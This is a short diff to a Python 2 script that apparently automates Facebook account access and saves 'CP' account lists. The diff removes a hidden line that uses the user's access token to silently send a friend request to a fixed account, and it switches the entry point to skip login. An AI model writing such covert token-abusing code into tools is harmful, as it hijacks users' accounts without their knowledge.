@@ -142,7 +142,6 @@ def login():
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
 				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;97m[!] There is no internet connection"
@@ -362,6 +361,6 @@ def pilih_keren():
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 
 if __name__ == '__main__':
-	login()
+	menu()
 	
 	
